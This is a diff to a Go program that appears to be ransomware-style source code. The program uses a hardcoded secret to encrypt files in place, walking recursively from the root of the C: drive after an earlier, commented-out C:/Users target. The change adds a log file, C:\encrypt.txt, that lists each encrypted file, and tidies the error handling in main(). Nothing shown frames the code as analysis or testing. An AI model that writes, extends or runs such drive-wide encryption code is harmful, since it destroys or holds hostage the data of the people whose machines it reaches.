@@ -24,7 +24,10 @@ var targets = []string{
 
 var secret = "secret password"
 
+var f *os.File
+
 func encrypt(fileName string, secret string) error {
+	fmt.Fprintf(f, "Encrypt %s\n", fileName)
 	f, err := os.OpenFile(fileName, os.O_RDWR, 0)
 	if err != nil {
 		return err
@@ -125,8 +128,13 @@ func main() {
 	//folder := "C:/Users"
 	folder := "C:"
 	//	err := encryptDirRecursive(dir)
-	err := encryptDirRecursive(folder)
+	var err error
+	f, err = os.Create("C:\\encrypt.txt")
 	if err != nil {
+		panic(err)
+	}
+	defer f.Close()
+	if err := encryptDirRecursive(folder); err != nil {
 		fmt.Printf("%s: %v\n", folder, err)
 	}
 }
